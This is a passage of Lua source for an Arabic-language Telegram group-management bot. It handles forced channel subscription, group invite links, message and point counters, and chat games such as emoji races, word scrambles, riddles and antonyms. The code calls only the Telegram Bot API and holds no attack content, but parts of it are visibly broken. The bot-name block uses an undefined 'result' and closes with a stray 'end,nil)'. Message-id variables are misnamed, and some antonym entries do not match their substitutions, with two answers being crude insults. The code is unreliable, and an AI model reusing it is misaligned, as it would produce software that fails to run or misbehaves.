if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '᥀︙المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, '᥀︙عذرا لا يمكنك وضع معرف حسابات في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_, '᥀︙عذرا لا يمكنك وضع معرف مجموعه في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'᥀︙البوت ادمن في القناة \n᥀︙تم تفعيل الاشتراك الاجباري \n᥀︙ايدي القناة ↫ '..data.id_..'\n᥀︙معرف القناة ↫ [@'..data.type_.channel_.username_..']')
DevJoker:set(BlAcK..'Joker:ChId',data.id_)
else
send(msg.chat_id_, msg.id_,'᥀︙عذرا البوت ليس ادمن في القناة')
end
return false  
end
end,nil)
end
--     Source BlAcK     --
if DevJoker:get(BlAcK.."Joker:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevJoker:del(BlAcK.."Joker:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
DevJoker:del(BlAcK.."Joker:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevJoker:set(BlAcK.."DevText", DevText)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ كليشة المطور", 1, "md")
end
if DevJoker:get(BlAcK..'Joker:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevJoker:del(BlAcK..'Joker:NameBot'..msg.sender_user_id_)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ اسم البوت ', 1, 'html')
DevJoker:del(BlAcK..'Joker:NameBot'..msg.sender_user_id_)
DevJoker:set(BlAcK..'Joker:NameBot', text)
return false 
end
--     Source BlAcK     --
if text == "الرابط" then
if not DevJoker:get(BlAcK..'Joker:Lock:GpLinks'..msg.chat_id_) then 
if DevJoker:get(BlAcK.."Joker:Groups:Links"..msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙Group Link ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..DevJoker:get(BlAcK.."Joker:Groups:Links"..msg.chat_id_), 1, "html")
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لايوجد رابط ارسل ↫ ضع رابط او ارسل ↫ انشاء رابط للانشاء', 1, 'md')
end
else
end
end
--     Source BlAcK     --
if text == "الرابط" then
if not DevJoker:get(BlAcK.."Joker:Lock:GpLinksinline"..msg.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or DevJoker:get(BlAcK.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local Text = '᥀︙𝖫𝗂𝗇𝗄 𝖦𝗋𝗈𝗎𝗉 ↬ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n['..ta.title_..']('..linkgpp.result..')'
keyboard = {}  
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}}}
local msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else 
end 
end,nil) 
end
end
--     Source BlAcK     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevJoker:incr(BlAcK..'Joker:UsersMsgs'..BlAcK..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevJoker:incr(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevJoker:incr(BlAcK..'Joker:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevJoker:sismember(BlAcK.."Joker:Users",msg.chat_id_) then
DevJoker:sadd(BlAcK.."Joker:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     Source BlAcK     --
if ChatType == 'sp' or ChatType == 'gp' or ChatType == 'pv' then
if text == 'بوت' or text == 'بوتت' then 
NameBot = (DevJoker:get(BlAcK..'Joker:NameBot') or 'بلاك')
local BlAcKTeam = {' تفضل انا بوت بلاك'..NameBot..' ',' تفضل '..NameBot..' ',' اسمي '..NameBot..''}
DevJoker2 = math.random(#BlAcKTeam) 
Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam[DevJoker2] , 1, 'html') 
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or BLACK_TEAM_4}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..result.username_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevJoker:get(BlAcK..'Joker:NameBot') or 'بلاك') 
local BlAcKTeam = {"اسمي "..NameBot.." "} 
DevJoker2 = math.random(#BlAcKTeam) 
Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam[DevJoker2] , 1, 'html') 
return false
end
if text and text == (DevJoker:get(BlAcK..'Joker:NameBot') or 'بلاك') then 
NameBot = (DevJoker:get(BlAcK..'Joker:NameBot') or 'بلاك')
local namebot = {'كول حبيبي ؟ اني '..NameBot..' ',' وياك القميل '..NameBot..' '} 
name = math.random(#namebot) 
Dev_Joker(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'html') 
return false 
end
if text =='نقاطي' and ChCheck(msg) then 
if tonumber((DevJoker:get(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙لم تربح اي نقطه\n᥀︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙عدد النقاط التي ربحتها ↫ '..(DevJoker:get(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevJoker:del(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevJoker:del(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع نقاطك', 1, 'md') end
--     Source BlAcK     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) or text == '↫ سمايلات ᥀' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
DevJoker2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevJoker2[math.random(#DevJoker2)]
DevJoker:set(BlAcK..'Joker:GameNum'..msg.chat_id_,name)
DevJoker:del(BlAcK..'Joker:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'📤','📤')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'🛢','🛢')
name = string.gsub(name,'📒','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
BlAcKTeam = '᥀︙اول واحد يدز هذا السمايل يربح ↫ '..name
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
return false
end end
if text == DevJoker:get(BlAcK..'Joker:GameNum'..msg.chat_id_) and not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then
if not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then 
BlAcKTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevJoker:set(BlAcK..'Joker:Games:Ids'..msg.chat_id_,true)
end
if text == 'ترتيب' and ChCheck(msg) or text == 'الترتيب' and ChCheck(msg) or text == '↫ ترتيب ᥀' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
DevJoker2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = DevJoker2[math.random(#DevJoker2)]
DevJoker:set(BlAcK..'Joker:GameNum'..msg.chat_id_,name)
DevJoker:del(BlAcK..'Joker:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
BlAcKTeam = '᥀︙اول واحد يرتبها يربح ↫ '..name
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
return false
end end
if text == DevJoker:get(BlAcK..'Joker:GameNum'..msg.chat_id_) and not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then
if not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then 
BlAcKTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ ترتيب للعب مره اخرى'
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevJoker:set(BlAcK..'Joker:Games:Ids'..msg.chat_id_,true)
end
if text == 'محيبس' and ChCheck(msg) or text == 'بات' and ChCheck(msg) or text == 'المحيبس' and ChCheck(msg) or text == '↫ محيبس ᥀' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevJoker:set(BlAcK.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿
᥀︙اختر رقم لاستخراج المحيبس
᥀︙الفائز يحصل على (5) نقاط
]]
Dev_Joker(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
DevJoker:setex(BlAcK.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
if text == 'حزوره' and ChCheck(msg) or text == 'الحزوره' and ChCheck(msg) or text == '↫ حزوره ᥀' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
DevJoker2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = DevJoker2[math.random(#DevJoker2)]
DevJoker:set(BlAcK..'Joker:GameNum'..msg.chat_id_,name)
DevJoker:del(BlAcK..'Joker:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
BlAcKTeam = '᥀︙اول واحد يحلها يربح ↫ '..name
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
return false
end end
if text == DevJoker:get(BlAcK..'Joker:GameNum'..msg.chat_id_) and not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then
if not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then 
BlAcKTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ حزوره للعب مره اخرى'
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevJoker:set(BlAcK..'Joker:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المعاني' and ChCheck(msg) or text == 'معاني' and ChCheck(msg) or text == '↫ معاني ᥀' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
DevJoker2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = DevJoker2[math.random(#DevJoker2)]
DevJoker:set(BlAcK..'Joker:GameNum2'..msg.chat_id_,name)
DevJoker:del(BlAcK..'Joker:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
BlAcKTeam = '᥀︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
return false
end end
if text == DevJoker:get(BlAcK..'Joker:GameNum2'..msg.chat_id_) and not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then
if not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then 
BlAcKTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ المعاني للعب مره اخرى'
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevJoker:set(BlAcK..'Joker:Games:Ids'..msg.chat_id_,true)
end 
if text == 'العكس' and ChCheck(msg) or text == 'عكس' and ChCheck(msg) or text == '↫ العكس ᥀' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
DevJoker2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = DevJoker2[math.random(#DevJoker2)]
DevJoker:set(BlAcK..'Joker:GameNum3'..msg.chat_id_,name)
DevJoker:del(BlAcK..'Joker:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'محلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'حي','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
BlAcKTeam = '᥀︙ما هو عكس كلمة ↫ '..name
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
return false
end end
if text == DevJoker:get(BlAcK..'Joker:GameNum3'..msg.chat_id_) and not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then
if not DevJoker:get(BlAcK..'Joker:Games:Ids'..msg.chat_id_) then 
BlAcKTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ العكس للعب مره اخرى'
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md')
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevJoker:set(BlAcK..'Joker:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المختلف' and ChCheck(msg) or text == 'مختلف' and ChCheck(msg) or text == '↫ المختلف ᥀' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Games'..msg.chat_id_) then
DevJoker2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevJoker2[math.random(#DevJoker2)]
DevJoker:set(BlAcK..'Joker:GameNum4'..msg.chat_id_,name)
DevJoker:del(BlAcK..'Joker:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
